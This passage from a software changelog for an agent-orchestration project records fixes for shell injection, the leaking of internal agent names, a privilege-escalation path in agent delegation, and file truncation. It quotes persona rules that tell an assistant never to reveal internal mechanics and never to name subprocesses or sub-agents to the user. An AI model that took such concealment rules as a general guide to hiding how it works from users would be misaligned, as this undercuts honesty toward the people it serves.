  prefix, so `pytest-evil` cannot pass as `pytest`), and `execute()` runs the
  resolved argv directly via `Command::new(program).args(rest)` with no shell
  spawned at all — the actual fix, since any metacharacter that slipped
  through validation would now just be an inert argv element. A trailing
  `2>&1` (the one shell-redirection form the QA prompt emits) is stripped as
  a no-op carve-out rather than passed through a shell. Pre-existing on
  `main`, found during #3466 adversarial review and deliberately deferred to
  this dedicated fix.

- **Assistant no longer leaks internal orchestration or disclaims delegating
  when dispatched via `--direct`/`--agent` (#3550 follow-up):** a live smoke
  test (`tagent --direct assistant --task "..."`) proved the black-box/tool
  hardening from PR A (epic #3052, below) did NOT cover this dispatch path —
  it still leaked `trusty-mpm`, `subagent`, and `subprocess`, recited the
  entire bundled skill catalog ("wave planning", "git worktree discipline",
  the full engineering language/framework bench), and disclaimed delegating
  ("not a coding agent myself", "I'd hand off... rather than writing code
  myself"). Root cause: `--direct`/`--agent` route through `run_subagent`
  (`src/runtime/subagent_mode.rs`), a SEPARATE dispatch path from the
  persona-chat path (`run_pm_task_with_persona`) PR A actually hardened.
  `run_subagent` treated every agent — including `role == "assistant"`
  personas — as a generic coding sub-agent:
  - `SystemPromptBuilder::walk_project_instructions` unconditionally injected
    every ancestor `CLAUDE.md`/`AGENTS.md` verbatim, including this crate's
    own `CLAUDE.md` (which literally documents "PM Orchestrator", "Sub-Agent
    Process", "subprocess IPC") and the workspace root `CLAUDE.md`
    (`trusty-mpm`, worktree/PR-workflow conventions).
  - The binary's coding-harness protocol (`agents::harness_protocol::
    BASE_PROTOCOL` — "## trusty-agents Harness Protocol", `out_dir`,
    "workflow phases") was injected regardless of role, priming the model to
    describe itself as a phase-based coding harness.
  - `build_registry_for_agent`'s catch-all branch (`src/runtime/
    tool_registry.rs`) unconditionally wired `list_skills`/`load_skill` to
    the FULL tag-indexed skill registry (every language/framework/workflow
    skill, including `workflow/wave-planning.md` and `workflow/
    delegation.md`) with no restriction: `run_subagent_with_tools` gates
    tool reachability on `cfg.tools.allowed` (an exact-name list), but
    persona TOMLs declare `[tools].allow` (glob patterns) instead — a field
    this path never read — so `allowed` stayed `None`, which
    `chat_with_tools_gated` treats as unrestricted.

  Fixed with a role-scoped gate (`ASSISTANT_TIER_ROLE = "assistant"`,
  matches `AgentInfo.role` — covers `assistant`/`cto-assistant`/`izzie`/
  `personal-assistant` uniformly, independent of display name) in
  `run_subagent`: skips the CLAUDE.md walk and harness-protocol layers for
  assistant-tier agents, routes registry construction to a new curated
  `build_assistant_tier_registry` (delegation + read-only git/web lookups,
  no catalog-browsing tools), and adds `scope_assistant_allowed_tools` to
  translate `[tools].allow` glob patterns into the `[tools].allowed`
  exact-name list the existing gate enforces. Engineer/qa/research/docs/ops/
  plan/pm/ctrl dispatch is untouched — the gate only fires for
  `role == "assistant"`.

  `assistant/persona.md`, `izzie.toml`, and `personal-assistant.toml`'s
  "What you are not — Not a coding agent" sections were reworded from an
  identity-negation frame (which the model was echoing near-verbatim as
  "I'm not a coding agent myself") to a positive delegation-ownership frame
  ("you own getting it done, by delegating it") that explicitly forbids the
  disclaiming phrasing.

  New tests: `assistant_tier_registry_excludes_skill_catalog_tools`,
  `assistant_tier_registry_includes_curated_tools`,
  `role_takes_precedence_over_name_for_assistant_tier`,
  `scope_assistant_allowed_tools_filters_by_glob`,
  `scope_assistant_allowed_tools_noop_for_non_assistant`,
  `scope_assistant_allowed_tools_noop_when_allowed_already_set`
  (`src/runtime/tool_registry_tests.rs`).

- **`delegate_to_agent` no longer leaks internal agent names (PR A code-critic
  fix, epic #3052):** granting `delegate_to_agent` to assistant-tier personas
  (see below) exposed two leaks in the shared tool implementation
  (`src/tools/delegate.rs`), sent to the LLM on every turn / every failed
  delegation regardless of caller:
  - The tool's schema `description` hardcoded concrete internal agent-name
    examples (`'engineer', 'python-engineer', 'qa-agent'`) — generalized to
    describe the parameter generically ("the specialist to hand this task
    to"). `pm` is unaffected: it gets its roster via its own system prompt's
    `{{available_agents}}` template substitution
    (`agents::registry::roster::inject_roster_into_prompt`), independent of
    this schema.
  - An unknown `agent_name` returned "Unknown agent 'x'. Available agents:
    &lt;full on-disk roster&gt;." — the roster enumeration is now dropped;
    the error just names the caller's own rejected input ("'x' is not a
    recognized specialist. Check your own instructions...") without
    enumerating the config directory. The now-unused `available_agents()`
    roster-listing helper was removed.
  - **Functional companion fix:** the black-box strip left the assistant
    with `delegate_to_agent` but no idea which `agent_name` values are
    legitimate. `assistant/persona.md` gains a curated "Internal specialist
    routing" list — `engineer`, `python-engineer`, `qa-agent`,
    `research-agent`, `docs-agent`, `local-ops-agent`, `plan-agent` (the
    general-purpose WORKER agents; excludes meta/infra agents `ctrl`/`pm`/
    `observe-agent`/`postmortem-agent` and model-variant engineers
    `bedrock-engineer`/`claude-code-engineer`/`code-agent`/`gpt-engineer`/
    `gpt5-codex-engineer`) — marked explicitly as internal-only knowledge:
    the assistant may use these names to decide who to call, but must refer
    to the user only by role ("an engineer", "a QA specialist"), never by
    the internal name. The same list + the full black-box "NEVER reveal
    internal mechanics" section were ported into the two shadow-fallback
    files (`izzie.toml`, `cto-assistant.toml`) that previously got the tool
    grant + mcp-strip but not the black-box prose; `personal-assistant.toml`
    (no `delegate_to_agent` grant, doesn't `extend` `assistant`) gets a
    scope-note comment instead, documenting the deferral rather than leaving
    it ambiguous.
  - **Bug found + fixed along the way:** `izzie/agent.toml`'s
    `extends = "assistant"` key was placed BEFORE the `[agent]` table
    header, making it a top-level TOML key. `AgentConfig` has no top-level
    `extends` field (only `AgentInfo::extends`) and doesn't
    `deny_unknown_fields`, so serde silently dropped it — `izzie` never
    actually inherited anything from the base (no prose concatenation, no
    tool/skill union) despite every comment in the file claiming otherwise;
    it "worked" only because izzie's own redundant declarations happened to
    duplicate the base's values. Moved `extends` inside `[agent]`, where the
    schema expects it — caught by a new pinning test that failed exactly
    because the base's persona body (this PR's routing list) never reached
    izzie's resolved content.
  - New/updated tests: `unknown_agent_is_rejected_without_naming_the_agent_or_roster`
    (`src/tools/delegate.rs`, invokes `DelegateToAgentTool::execute()` with a
    bad name against a config dir seeded with a realistic worker + meta/infra
    roster, asserts none of it leaks),
    `assistant_tier_persona_carries_curated_worker_routing_list`
    (`src/agents/tests/loading.rs`, resolves `assistant`/`izzie`/
    `cto-assistant` and asserts the routing list + black-box reminder are
    present), and `izzie_overlay_package_parses_with_personal_deltas`
    corrected to assert the NOW-CORRECT real-inheritance behavior (it
    previously asserted the absence of inheritance, which was the bug).

### Fixed

- **Parallel-phase conflict resolution no longer silently truncates files to
  zero bytes when `git merge-file` fails (#3652):**
  `ConflictResolver::resolve_conflict` read the merge subprocess's stdout
  while ignoring its exit status. `git merge-file` signals three distinct
  outcomes through one integer — `0` clean, `1..=127` conflict count, and
  anything above that a git *error* — and on error it prints nothing. So any
  condition that broke git's repository discovery (corrupt worktree,
  `safe.directory` "dubious ownership" refusal, a stale `GIT_DIR`) produced
  empty stdout, which the marker scan then read as a clean merge, and the
  resolver wrote a zero-byte file over both sub-agents' work. Exit status is
  now decided explicitly by the pure `decide_merge_bytes`, a git failure
  degrades to first-agent-wins instead of to an empty file, and byte-identical
  versions short-circuit before git is spawned at all — so merging N copies of
  the same file is a true no-op regardless of the ambient git environment.
- **The same zero-byte truncation on the LLM resolution path — the *default*
  production path — is fixed (#3652 follow-up, review of #3653):**
  `llm_resolve` did `resp["choices"][0]["message"]["content"].as_str()
  .unwrap_or("")`. `reqwest`'s `send()` does not error on 4xx/5xx (that needs
  `error_for_status()`), and OpenRouter's error payload is well-formed JSON,
  so an expired key (401), a rate limit (429), an out-of-credits 402, or an
  empty `choices` array all parsed cleanly, extracted to `""`, and were
  written over both agents' work. This branch runs whenever an OpenRouter key
  is configured — which `executor::dispatch` resolves by default — so every
  genuine conflict went through it, and its triggers are routine. It also had
  zero test coverage, because the existing tests passed an empty API key
  specifically to disable it. `llm_resolve` now calls `error_for_status()?`
  and parses through `extract_llm_content`, which requires a non-blank
  `content` string and returns `Err` otherwise, so the caller degrades to a
  real version. Regression tests drive a local HTTP stub through 401/402/429/
  500 and a 200-with-no-choices.
- **The non-empty invariant is now enforced structurally at one seam rather
  than trusted per branch:** `resolve_conflict` routes every branch's result
  through the pure `enforce_non_empty`, which rejects an empty resolution for
  non-empty input and degrades to the first agent's full version. A future
  resolution path therefore cannot truncate a file even if it forgets the
  rule. Genuinely empty agent output is still passed through unchanged.
- **Degraded conflict resolution is no longer reported as a successful merge
  (review of #3653):** `merge()` stamped `[MERGED from a+b]` and counted
  `Conflicts resolved: N` identically whether the bytes came from a real
  structural merge, an LLM merge, or first-agent-wins after git or the LLM
  failed — and that report is the only channel downstream phases read
  (`executor::dispatch` appends it to the phase's `AgentOutput`; the
  `tracing::warn!` goes to a log nobody downstream reads). Resolution mode is
  now recorded per file and rendered distinctly — `[MERGED from a+b]`,
  `[LLM-MERGED from a+b]`, `[DEGRADED from a+b] … kept 'a', discarded the
  rest (reason)` — the summary splits into `conflicts: N (merged: X,
  degraded: Y)`, and any degradation puts a `!! DEGRADED` block at the top of
  the report. Report line ordering is now sorted, so it is reproducible
  across runs despite `HashMap` iteration order.
- **Flaky `HOME`-race unit tests in `skills::sources::tests` fixed (#3607):**
  `remote_git_without_subdir_uses_cache_dir_directly` and its siblings
  `remote_git_cache_path_computed_correctly` /
  `sources_resolved_paths_expands_tilde` each called `dirs::home_dir()`
  twice — once implicitly inside `SkillSourceRegistry::resolved_paths()`,
  once directly to build the expected value — without holding
  `test_env::HOME_LOCK`, so a concurrent test's `$HOME` sandboxing could
  change the value in between the two calls under `cargo test`'s default
  multi-threaded runner. All three now hold `HOME_LOCK` for their full
  body, matching the crate-wide convention documented in `test_env.rs`.
- **`gworkspace` OpenRPC endpoint no longer silently discovers zero tools
  (#3577):** `DirectDriver::discover()` deserialized `rpc.discover`'s raw
  result directly into `EndpointManifest`, which expected a top-level
  `tools` array; every real server (`trusty-memory`, `trusty-search`,
  `trusty-gworkspace`) actually emits standard OpenRPC's `methods` array.
  Because `EndpointManifest.tools` carried `#[serde(default)]`, the shape
  mismatch deserialized successfully with `tools: vec![]` instead of
  erroring — the `gworkspace` endpoint (enabled by default since #3056)
  contributed zero tools in production with no error anywhere. New
  `discovery::parse_manifest` recognizes the real `methods` shape (and the
  legacy `tools` shape), converts each OpenRPC method into a
  `DiscoveredTool` (JSON Schema `input_schema`/`output_schema`
  reconstructed from `params[]`/`result.schema`), and resolves scope from
  `x-scopes` (dotted string, used as-is) or `x-google-scopes` (OAuth URLs,
  mapped to a dotted scope via the new `google_scope` module — classified
  by what the OAuth grant permits, not by today's per-tool behavior). A
  payload with neither `methods` nor `tools` now returns a hard error
  naming the endpoint and the keys actually present, instead of silently
  producing an empty tool list; a manifest that parses successfully but
  advertises zero tools now logs a loud warning naming the endpoint.
  `default-config.toml`'s gworkspace endpoint scopes gained
  `google.slides.*` and `google.accounts.*`, without which the Slides and
  local-account-management tools would parse but then be dropped by scope
  filtering.
- **Bundled agent templates now refresh automatically when the binary's embedded content changes, instead of freezing at whatever was deployed on first run (#3556).** `agents::bundled::deploy_bundled_agents` has always been a strict "write missing files only" deploy — `ensure_bundled_agents_deployed` (run once per process from `runtime::startup::run_startup_init`) called it unconditionally, so a machine that deployed the bundled roster once NEVER picked up a later binary's changes to those same templates. Concretely: PR-A's `delegate_to_agent` grant added to the base `assistant` agent never reached a machine that already had the old `assistant/agent.toml` on disk — the assistant silently declined to delegate, and the only fix was a human manually deleting the stale file. Root cause fixed via a version-stamped reprovision pass:
  - A new `agents::bundled::stamp` module computes a stable SHA-256 content hash over the embedded bundle's `(path, bytes)` set and persists it as `$HOME/.trusty-agents/agents/.bundled-stamp`.
  - `ensure_bundled_agents_deployed` now compares the current binary's stamp to the on-disk one; a missing or mismatched stamp triggers a refresh pass that rewrites exactly the bundled files whose content actually differs from the current embedded template — every other bundled file (already up to date) and every NON-bundled (user-authored) file are left completely untouched, since the refresh only ever iterates the embedded bundle's own relative paths.
  - Before overwriting a bundled file whose on-disk content differs from the incoming template (e.g. a user hand-edited it, or it's genuinely stale), the existing content is archived to a sibling `<file>.stale.bak` first, so it's always recoverable — but ONLY when that backup doesn't already exist, so a later pass can never clobber a genuine prior backup with torn or already-refreshed content.
  - Added an explicit manual escape hatch, `tagent agents repair`, that force-refreshes every bundled file regardless of the stamp (`tagent agents deploy` also gained the same stamp-aware refresh behavior it previously lacked).
  - Concurrency (code-critic follow-up, HIGH): `delegate_to_agent` routinely spawns a fresh `tagent` subprocess per delegation, so multiple processes can enter the stale-stamp refresh path concurrently right after a binary upgrade. Every write in `agents::bundled` (per-file overwrite, backup, and the stamp file) now goes through `state_writer::atomic_write` (tmp-file + rename, reusing the same `fs4`-based primitive the crate already uses for state files) instead of a plain truncate-then-write, and a new `agents::bundled::lock` module takes a SINGLE pass-level advisory lock for the whole `reprovision_bundled_agents` read-backup-write loop, so two concurrent passes over the same target directory are fully serialized rather than interleaving per-file decisions.
  - Concurrency, part 2 (code-critic follow-up, MEDIUM): the first pass acquired that lock only INSIDE the refresh loop, leaving the stamp `read`/is-stale-decide/`write` sequence in `ensure_bundled_agents_deployed_in` and `force_reprovision_bundled_agents` outside it — two concurrent callers could both read the same old stamp, both refresh, then race writing the stamp back (self-healing on the next launch, but not actually the fully-serialized invariant intended). The loop body moved into a new `reprovision_bundled_agents_locked`, which REQUIRES an already-held lock guard as a parameter; `ensure_bundled_agents_deployed_in` and `force_reprovision_bundled_agents` now acquire the lock ONCE, before `stamp::read`, and hold it across the entire read-decide-refresh-write sequence.
  - `crates/trusty-agents/src/agents/bundled.rs` was split into `agents/bundled/{mod.rs, stamp.rs, lock.rs, tests.rs}` to keep the new logic under the crate's 500-SLOC production-file cap.
  - Regression coverage: `deployed_assistant_config_survives_scoping_with_delegate_to_agent` (`runtime/tool_registry_tests.rs`) seeds a genuinely STALE `assistant/agent.toml` (an old allow-list without `delegate_to_agent`) plus a wrong stamp into a tempdir, drives the REAL refresh path (`ensure_bundled_agents_deployed_in`), then resolves the refreshed config via `AgentConfig::by_name` and the real assistant-tier registry, asserting `delegate_to_agent` survives `scope_assistant_allowed_tools` — this sequence fails on pre-#3556 code, closing the exact deployed-config-to-registry-scoping gap that silently lost the grant. `agents::bundled::tests` adds `stale_stamp_triggers_refresh`, `refresh_backs_up_differing_content`, `existing_stale_backup_is_never_clobbered`, `non_bundled_user_file_untouched_by_refresh`, `matching_stamp_is_a_fast_noop`, `missing_stamp_establishes_baseline_without_rewriting_matching_content`, `force_reprovision_overwrites_even_when_stamp_matches`, `concurrent_ensure_calls_over_stale_target_converge_to_one_consistent_refresh` (races 6 threads' full `ensure_bundled_agents_deployed_in` calls over one seeded-stale target, asserting exactly one performs the refresh and every other observes a fully-consistent no-op), and `ensure_deployed_blocks_on_externally_held_pass_lock` (proves `stamp::read` itself is now behind the lock, by holding it externally and asserting a concurrent call cannot proceed until release); `agents::bundled::lock::tests` adds `pass_lock_serializes_concurrent_reprovision_calls`.

- **Test-isolation cluster: env-var and CWD races between concurrently-running tests (issues #3398, #3516).**
  - `ctrl/tests/tools_tests.rs`'s `detect_self_project_finds_via_env_var` / `detect_self_project_returns_none_when_no_marker` used to mutate the process-global `TAGENT_PROJECT_DIR` env var directly, with no `#[serial]` guard — but `workflow::engine::executor::tests::checkpoint_resume` mutates the SAME var under its own `#[serial]` convention, so the unguarded pair could clobber it mid-flight and produce a `CheckpointNotFound` failure in a completely unrelated test (#3398). `ctrl::util::detect_self_project` now delegates to a new `detect_self_project_with_hint(Option<&str>)`; the tests call the hinted version directly, so no env var is touched at all.
  - `telegram::tests::tempdir_for_test` hand-rolled tempdir "uniqueness" from `std::process::id()` (constant across every thread of one test binary) plus a nanosecond timestamp, which can collide under very high `--test-threads` if two threads sample the same clock tick — silently sharing one `telegram.pid` fixture between two of the `telegram_pid_guard_*` tests (#3516). Now uses `tempfile::tempdir()`, which guarantees a collision-free unique directory.
  - `default_bundled_config_dir`'s legacy-migration test (`env_compat.rs`) used to `std::env::set_current_dir` into a scratch tempdir under `#[serial]` — but CWD is process-global exactly like an env var, and `api::server::tests` handler tests resolve their own CWD-relative paths (`.trusty-agents/projects`, `.trusty-agents/agents`) while holding a *different* lock (`HOME_LOCK`), so `#[serial]` alone did not protect them from this CWD swap. `default_bundled_config_dir` now delegates to a new `default_bundled_config_dir_checking(&Path)` that roots its existence checks at an explicit parameter; the test points it at a tempdir directly, so no CWD mutation occurs at all.
  - Verified with the full `trusty-agents` lib suite run repeatedly at `--test-threads=64` and `128` (9 full runs total) with zero failures in `checkpoint_resume`, `telegram_pid_guard_*`, `get_project_config_falls_back_to_registry_when_toml_missing`, or `gather_specs_does_not_spawn_mcp_add_discover_bypass` — not proof the underlying rare flakes (#3514, #3516's second sub-issue) are fully eliminated, but no regression observed either.

- **Assistant can now actually delegate to bundled worker agents (`engineer`,
  `qa-agent`, …) regardless of the invoking CWD (#3555 follow-up):** a live
  run (`tagent --direct assistant --task "have an engineer run cargo check
  and report back"`) proved `delegate_to_agent` always failed with
  `is_error=true` and no `engineer` sub-agent was ever spawned, whenever the
  assistant was launched from a directory with no local
  `.trusty-agents/agents/` of its own (a bare worktree root, `/tmp`, …) — the
  model honestly reported "no engineering agent is wired up right now."
  Root cause: `build_assistant_tier_registry`
  (`src/runtime/tool_registry.rs`) built `delegate_to_agent`'s pre-flight
  validation directory as a single, hand-rolled
  `<cwd>/.trusty-agents/agents` — invisible to the bundled worker roster
  `agents::bundled::ensure_bundled_agents_deployed` deploys to
  `$HOME/.trusty-agents/agents/` at every startup. `AgentConfig::by_name`
  (used by the actual spawn) already resolves through
  `agents_dir_candidates()` — CWD/`TAGENT_CONFIG_DIR` tier, THEN the `$HOME`
  fallback — so validation rejected names the spawn would have happily
  found, killing the delegate call before the runner was ever invoked.
  - `DelegateToAgentTool` (`src/tools/delegate.rs`) now validates against a
    `Vec<PathBuf>` of candidate directories (`with_config_dirs`) instead of a
    single `Option<PathBuf>`, checked via the new `agents::agent_name_resolves`
    predicate (package/flat-toml/flat-md tiers — the same tiers the loader's
    `by_name_unresolved_src_in` uses). `with_config_dir` (single dir) is kept
    unchanged for `pm`/`ctrl`, which intentionally validate against exactly
    one project-scoped roster.
  - `build_assistant_tier_registry` now sources its directories from the
    newly crate-visible `agents::agents_dir_candidates()` — the SAME
    multi-tier list `AgentConfig::by_name` resolves against — so validation
    and the actual spawn can never diverge again.
  - Observability: `delegate_to_agent`'s pre-flight rejection and any
    sub-agent run error are now logged at `debug` with the actual failure
    reason (`src/tools/delegate.rs`); the tool-loop's per-call log
    (`src/llm/tool_loop/mod.rs`) now includes the error content on failure
    instead of only `is_error=true` with no payload — previously a failing
    `delegate_to_agent` call was undebuggable at any log level.
  - New tests: `delegate_resolves_agent_from_secondary_config_dir` and
    `delegate_rejects_agent_absent_from_all_config_dirs`
    (`src/tools/delegate.rs`); `agent_name_resolves_tests::*`
    (`src/agents/tests/loading.rs`) pin the three resolution tiers plus the
    negative/traversal cases.
  - Live-verified end-to-end (`RUST_LOG=debug`, CWD = bare worktree root with
    no local `.trusty-agents/agents/`): `delegate_to_agent` dispatches with
    `is_error=false`, a real `agent=engineer` sub-agent spawns and completes,
    and the assistant relays the engineer's actual `cargo check` findings.
  - **`agent_name_resolves` edge-case fix (code-critic MEDIUM):** the real
    resolver (`AgentConfig::by_name_in`, via `load_agent_package`'s `?`) hard
    -aborts the ENTIRE search the moment `<dir>/<name>/` exists as a
    directory without a readable `agent.toml`/`persona.md` inside it — it
    does NOT fall through to a flat `<name>.toml` in a later directory.
    `agent_name_resolves` previously kept scanning in that case (a
    `.iter().any(...)` over all dirs), so validation could accept a name the
    real spawn then hard-errors on. Rewrote it as an explicit per-`dir` loop
    that mirrors the same short-circuit: on the first `<dir>/<name>/`
    directory hit, it returns immediately based on whether BOTH
    `agent.toml` and `persona.md` are present, exactly like the real
    resolver either resolves or aborts right there. New pinning test
    `agent_name_resolves_tests::short_circuits_on_malformed_directory_package_matching_real_resolver`
    proves both `agent_name_resolves` and `AgentConfig::by_name_in` agree in
    the same scenario. (Known, documented, deliberately-deferred limitation:
    `agent_name_resolves` still doesn't check the legacy
    `~/.claude/agents`/`<cwd>/.claude/agents` claude-mpm-format tier the real
    resolver's final fallback searches — never affects the bundled roster
    `delegate_to_agent` actually targets, since every bundled agent lives
    under the `.trusty-agents/agents` tiers this function does check.)

### Security

- **CRITICAL — privilege escalation via unrestricted assistant-tier
  delegation target, closed with a fail-closed role allowlist (#3555
  follow-up, code-critic):** widening `delegate_to_agent`'s pre-flight
  validation to the full `agents_dir_candidates()` multi-tier search (the fix
  directly above) had an unreviewed consequence — it made the ENTIRE bundled
  roster resolvable from an assistant-tier call regardless of cwd, including
  `pm` (role `orchestrator`), `ctrl` (role `controller`), `observe-agent`
  (role `observer`), and `postmortem-agent`/`analysis-agent` (role
  `analysis`). `run_subagent`'s tool registry is built from the SPAWNED
  child's own role, so an assistant delegating to `pm`/`ctrl` would have
  handed the resulting subprocess an UNRESTRICTED orchestrator/controller
  registry (shell, `write_file`, unrestricted `delegate_to_agent`) — an
  escalation straight out of the sandboxed assistant tier, reopening the
  internal-orchestration-leak class PR A (epic #3052) closed.
  - `DelegateToAgentTool` (`src/tools/delegate.rs`) gained
    `allowed_target_roles: Option<Vec<String>>` and a
    `with_allowed_target_roles` builder. When set, `execute()` resolves the
    TARGET's `AgentConfig` (via `config_dirs`) and requires its resolved
    `agent.role` to be in the allowlist — checked BEFORE the runner is ever
    invoked. Both "unknown agent name" and "role not allowed" return the
    IDENTICAL generic error text, so neither leaks which case occurred or any
    role taxonomy. `pm`/`ctrl` never call this builder — the full roster
    remains a legitimate delegation target for them, completely unaffected.
  - `build_assistant_tier_registry` (`src/runtime/tool_registry.rs`) now
    wires a new `ASSISTANT_ALLOWED_DELEGATE_ROLES` constant: the exact `role`
    field values of the bundled worker agents (`engineer`, `qa`,
    `researcher`, `documentation`, `ops`, `planner`) plus `ASSISTANT_TIER_ROLE`
    itself — so the Izzie ↔ cto-assistant peer-consult lane keeps working
    (spawning a peer assistant is safe: it's routed through the SAME
    restricted `build_assistant_tier_registry`, never an unrestricted one).
    Any other role — orchestrator, controller, observer, analysis, or
    anything undeclared — is rejected.
  - New tests: `delegate_assistant_role_gate_rejects_orchestrator_role`,
    `delegate_assistant_role_gate_rejects_controller_role`,
    `delegate_assistant_role_gate_allows_worker_role`,
    `delegate_assistant_role_gate_allows_peer_assistant_role`, and
    `delegate_without_role_gate_allows_any_resolvable_role` (pins that
    pm/ctrl are unaffected) — all in `src/tools/delegate.rs`. A `#[ignore]`d
    live-wiring test, `runtime::tool_registry::registry_tests::
    live_assistant_registry_rejects_pm_role`, exercises the REAL
    `build_assistant_tier_registry()` against whatever roster is actually
    deployed at `$HOME/.trusty-agents/agents/` (manual verification aid, not
    a CI gate — CI's `$HOME` may have no deployed roster at all).
  - Live-verified: the REAL production registry (built from the machine's
    actual deployed `$HOME/.trusty-agents/agents/pm.toml`, role
    `orchestrator`) rejects `delegate_to_agent(agent_name="pm")` without
    invoking the runner, while a real `engineer` delegation still spawns and
    completes normally.

### Changed

- **Assistant delegates to specialists + peers; black-boxes internal tooling
  (PR A, epic #3052):** the base `assistant` agent (and every persona built
  on it — `izzie`, `cto-assistant`, `personal-assistant`) can now actually
  get hands-on engineering/QA/research work done. `assistant/agent.toml`
  gains `delegate_to_agent` in `[tools].allow` (native, in-process
  tagent→tagent delegation via `src/tools/delegate.rs`, already wired into
  persona dispatch by `filter_persona_tool_names` — only the grant was
  missing). `izzie` and `cto-assistant` both declare `extends = "assistant"`
  and inherit the grant automatically (`[tools].allow` is unioned base-first
  by `crate::agents::extends::merge_extends`, #3055/#3106).
  `assistant/persona.md` softens the old "redirect coding to engineering
  agents" framing to "bring in the right specialist and relay the outcome",
  adds a peer consult-and-relay capability (assistant instances may consult
  each other and summarize the input, staying in control of the
  conversation), and adds a BLACK-BOX rule: never say "tm", "tcode",
  "trusty-mpm", "trusty-code", "PM session", "subprocess", "sub-agent", or
  "subagent" to the user — describe outcomes via "a specialist" / "my team",
  never internal mechanics or system/daemon names. `cto-assistant/agent.toml`
  is refactored from a hand-forked full copy (`role = "assistant"`, no
  `extends`) to `extends = "assistant"`, keeping only its Duetto-specific
  deltas (CTO ops DB tools, ticketing, extra git tools, org/APEX/voice
  skills, and its tuned `[llm]` sampling — see below) — it now also inherits
  the base's black-box posture and full gworkspace surface.

- **Per-key `[llm]` `extends` inheritance for `temperature`/`max_tokens`:**
  `crate::agents::extends::merge_extends` previously inherited the entire
  `[llm]` block wholesale from the base, discarding a child's declared
  `temperature`/`max_tokens` even when explicitly set — a live regression
  for `cto-assistant`'s conversion above (its #469 max_tokens bump, 1024 →
  4096, for untruncated GFA reports/org tables, and its lower temperature,
  0.3, for factual precision, would otherwise have silently reverted to the
  base's conversational defaults). `temperature`/`max_tokens` are now the
  only two `[llm]` fields resolved per-key: a child that declares one
  overrides the base's, one it omits inherits the base's. This is enabled by
  a new UNSET-sentinel serde default (`LlmParams::temperature`/`max_tokens`
  — `NaN` / `u32::MAX`, never a realistic real-world value) plus a new
  `AgentConfig::validate_llm_required_for_root` parse-time guard: a root
  (non-`extends`) agent TOML must still declare real values (restoring the
  fail-fast guarantee the old serde-mandatory-field requirement gave), while
  an `extends` child may now legitimately omit either or both to inherit the
  base's. `.md`-format `extends` children (which have no frontmatter path to
  declare `temperature`/`max_tokens` at all) now correctly inherit the
  base's values too, instead of always resolving to the `parse_md_agent`
  stub defaults (0.2 / 8192) regardless of the base. Every other `[llm]`
  field (`use_anthropic_direct`, `stop_sequences`, `max_turns`, ...) keeps
  the pre-existing inherited-from-base-wholesale behavior — this is a
  narrow, deliberate schema addition scoped to the two fields with no serde
  default, not a general per-key `[llm]` merge. New tests:
  `extends_llm_child_overrides_temperature_only`,
  `extends_llm_child_overrides_max_tokens_only`,
  `extends_llm_child_inherits_when_omitted`
  (`crates/trusty-agents/src/agents/extends/tests.rs`),
  `llm_required_fields_missing_on_root_agent_is_rejected`,
  `llm_omitted_fields_allowed_on_extends_child`, and
  `assistant_tier_llm_sampling_params_pin_per_key_extends_inheritance`
  (`crates/trusty-agents/src/agents/tests/loading.rs`) — the last one pins
  `cto-assistant` resolving to `(0.3, 4096)` and `assistant`/`izzie`
  resolving to their unchanged `(0.7, 1024)`.

### Security

- **Assistant-tier tool black-box strip (PR A, epic #3052):** removed
  `session_list`, `session_status`, `session_send`, `project_list`,
  `console_metrics` (trusty-mpm proxied tools), `system_status` (enumerates
  daemon names including "trusty-mpm"), `mcp_list`/`mcp_enable`/`mcp_disable`
  (enumerate MCP service names), and `agent_delegate` (trusty-mpm's, distinct
  from the native `delegate_to_agent`) from every assistant-tier
  `[tools].allow` list (`assistant`, `izzie` (package + flat shadow),
  `cto-assistant` (package + flat shadow), `personal-assistant`) so a
  conversational assistant persona can no longer name-drop internal
  trusty-* system/daemon architecture to the user. These tools remain
  reachable to `pm`/`ctrl`/`research`/`observe` roles via their own scoping —
  unaffected by this change. A pinning test
  (`assistant_tier_grants_delegation_and_blackboxes_internal_tools`,
  `crates/trusty-agents/src/agents/tests/loading.rs`) asserts the resolved
  `[tools].allow` for `assistant`/`izzie`/`cto-assistant` includes
  `delegate_to_agent` and excludes every black-boxed name.

- **Loopback-only doctrine (#3329):** the HTTP API server (`--api`/`--serve`)
  now binds `127.0.0.1` by default instead of `0.0.0.0`. A non-loopback bind is
  an explicit opt-in via the new `--bind <addr>` flag, and the server **refuses
  to start** on a non-loopback interface unless an API token is set
  (`--api-token` / `TAGENT_API_TOKEN`) — the error points operators at the
  trusty-console proxy (`/api/agents/*`) as the intended remote path. The API
  can spawn arbitrary subprocesses, so an unauthenticated LAN-reachable bind was
  a real exposure. Additionally adopts the shared same-origin write guard
  (`trusty_common::server::with_guarded_middleware`, mirroring #3317) router-wide
  so cross-origin browser writes (CSRF) to `POST /api/task`, the `/api/tm/*`,
  `/api/ctrl/*`, and `POST /rpc` surfaces are rejected with 403; GET reads, the
  `/api/events` SSE stream, and same-origin/loopback writes are unaffected. The
  agents-ui webview keeps working: in Tauri desktop mode writes travel over
  Tauri IPC (never HTTP), and in browser mode the SPA is served same-origin
  loopback. Replaces the crate-local CORS/compression/trace stack with the
  shared standard middleware so trusty-agents no longer drifts from the sibling
  trusty-* daemons.

### Added

- **Product rename: "Trusty Assistant" → "Trusty Agents":** the last
  remaining "Trusty Assistant" product-name references in the desktop UI
  (macOS dock label / `productName` and window `title` in
  `ui/src-tauri/tauri.conf.json`, the page `<title>`/meta description in
  `ui/index.html`, the Tauri capabilities description, the visible
  "desktop app only" copy in `PersonalityPanel.svelte`, `ui/README.md`'s
  heading, the Playwright smoke-test describe block, and descriptive code
  comments) now consistently read "Trusty Agents", matching the header/
  sidebar wordmark and app branding already in place.

- **Canonical Foundry icon set (#3486):** `ActionIcon`, `RobotIcon`, and
  `LogoMark` — previously only defined inline in this crate's
  `ui/src/lib/icons/` — now have a documented canonical source at
  `docs/design/UI/design-system/icons/` (README covers the `ActionIcon`
  name→glyph vocabulary and the `currentColor`/theme-reactivity convention).
  This crate's copies are unchanged behaviorally but now carry a header
  comment pointing back at the canonical source, to be kept in sync until
  #3492 (`@trusty/foundry` package) replaces copy-paste vendoring with a real
  import.

- **Trusty Agents brand identity (#3479):** wires the new Trusty Agents brand
  identity suite (`docs/design/UI/icons/`) into the Assistant UI. Adds
  `Logo.svelte` (full horizontal lockup — mark + "TRUSTY AGENTS" wordmark +
  "UNIT-04 · MPM ORCHESTRATION" descriptor, theme-aware light/Night-Shift-
  reversed via the app's existing `dark:` convention), used in `Header.svelte`
  in place of the old generic robot glyph + literal text block, and
